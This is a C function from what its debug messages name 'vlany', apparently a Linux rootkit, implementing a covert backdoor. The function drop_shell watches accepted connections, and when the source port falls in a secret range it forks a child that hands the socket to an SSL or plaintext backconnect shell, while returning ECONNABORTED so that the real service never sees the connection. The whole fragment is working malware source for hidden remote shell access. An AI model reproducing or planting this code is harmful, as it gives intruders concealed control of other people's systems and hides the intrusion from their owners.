int drop_shell(int sockfd, struct sockaddr *addr)
{
    #ifdef DEBUG
        printf("[vlany] drop_shell() called\n");
    #endif

    struct sockaddr_in *sa_i = (struct sockaddr_in *) addr;
    pid_t my_pid;

    if(htons(sa_i->sin_port) >= LOW_PORT && htons(sa_i->sin_port) <= HIGH_PORT)
    {
        if((my_pid = fork()) == 0)
        {
            #ifdef SSL_BACKDOOR
                #ifdef DEBUG
                    printf("[vlany] connected via ssl accept() backdoor\n");
                #endif
                fsync(sockfd);
                backconnect(sockfd);
            #else
                #ifdef DEBUG
                    printf("[vlany] connected via plaintext accept() backdoor\n");
                #endif
                pbackconnect(sockfd);
            #endif
        }else{
            errno = ECONNABORTED;
            return -1;
        }
    }

    return sockfd;
}
